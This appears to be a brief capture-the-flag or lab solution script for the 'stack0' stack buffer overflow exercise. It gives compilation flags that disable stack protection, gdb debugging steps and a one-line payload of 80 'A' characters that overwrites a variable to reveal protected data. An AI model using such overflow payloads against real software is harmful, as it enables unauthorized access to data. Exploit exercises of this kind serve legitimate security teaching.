#In my computer, buffer is at 0x50, variable 0x4.
#ie it is enough to input 80 random characters, and the program will disclose confidential information
#Compilation
#g++ stack0.c -g -Wall -fno-stack-protector -o stack0
#after the compilation
#gdb ./stack0
#b main (breakpoint from function main)
#r (run)
#if opened source code
#Ctrl + x + a (source code)
#enter layout asm (assembly code)

#!/bin/bash 
echo `python -c 'print"A"*80'` | ./stack0
